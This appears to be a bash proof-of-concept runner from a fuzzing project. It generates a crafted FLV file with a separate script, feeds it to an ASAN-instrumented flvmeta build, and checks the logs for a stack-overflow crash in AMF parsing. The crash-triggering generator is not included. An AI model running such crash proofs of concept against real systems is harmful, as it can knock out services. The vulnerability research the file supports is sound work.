#!/usr/bin/env bash
# PoC runner for flvmeta VULN-001: Stack overflow via unbounded recursion in AMF parsing.

set -euo pipefail

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GEN_SCRIPT="$POC_DIR/vuln_001_gen.py"
FLV_FILE="$POC_DIR/vuln_001.flv"
RESULT_FILE="$POC_DIR/vuln_001_result.txt"
FLVMETA="/data/ylwang/non-textfuzz/target/flvmeta/build_test/src/flvmeta"

echo "[*] flvmeta VULN-001 PoC runner" | tee "$RESULT_FILE"
echo "[*] Date: $(date)" | tee -a "$RESULT_FILE"

# Step 1: Generate the FLV file if it doesn't exist
if [ ! -f "$FLV_FILE" ]; then
    echo "[*] Generating vuln_001.flv via gen.py..." | tee -a "$RESULT_FILE"
    python3 "$GEN_SCRIPT" "$FLV_FILE" 2>&1 | tee -a "$RESULT_FILE"
else
    echo "[*] vuln_001.flv already exists, skipping generation." | tee -a "$RESULT_FILE"
fi

echo "[*] FLV file size: $(stat -c%s "$FLV_FILE") bytes" | tee -a "$RESULT_FILE"

# Step 2: Run flvmeta with ASAN options
echo "[*] Running: $FLVMETA $FLV_FILE" | tee -a "$RESULT_FILE"

export ASAN_OPTIONS="detect_stack_use_after_return=1:halt_on_error=0:print_stats=1:log_path=/tmp/asan_flvmeta_vuln001"
export UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0"

# Capture both stdout/stderr; flvmeta may crash (exit != 0), so use || true
timeout 25 "$FLVMETA" "$FLV_FILE" >> "$RESULT_FILE" 2>&1 || {
    EXIT_CODE=$?
    echo "" | tee -a "$RESULT_FILE"
    echo "[!] flvmeta exited with code: $EXIT_CODE" | tee -a "$RESULT_FILE"
    if [ $EXIT_CODE -eq 139 ] || [ $EXIT_CODE -eq 11 ]; then
        echo "[!] SIGSEGV detected (exit code $EXIT_CODE) - stack overflow likely" | tee -a "$RESULT_FILE"
    elif [ $EXIT_CODE -eq 124 ]; then
        echo "[!] Process timed out" | tee -a "$RESULT_FILE"
    fi
}

# Step 3: Grep ASAN log files for errors
echo "" | tee -a "$RESULT_FILE"
echo "[*] Checking ASAN log files..." | tee -a "$RESULT_FILE"
for logfile in /tmp/asan_flvmeta_vuln001.*; do
    if [ -f "$logfile" ]; then
        echo "--- ASAN log: $logfile ---" | tee -a "$RESULT_FILE"
        grep -E "ERROR|WARNING|SEGV|stack-overflow|AddressSanitizer|UndefinedBehavior" "$logfile" | head -30 | tee -a "$RESULT_FILE" || true
    fi
done

# Step 4: Summary detection
echo "" | tee -a "$RESULT_FILE"
echo "[*] Crash signal summary:" | tee -a "$RESULT_FILE"
if grep -qiE "Segmentation fault|SIGSEGV|signal 11|stack.overflow|stack overflow|AddressSanitizer.*SEGV" "$RESULT_FILE"; then
    echo "[RESULT] CRASH DETECTED - stack overflow / SIGSEGV confirmed" | tee -a "$RESULT_FILE"
else
    echo "[RESULT] No crash signal found in output." | tee -a "$RESULT_FILE"
fi

echo "[*] Done. Full output in: $RESULT_FILE"
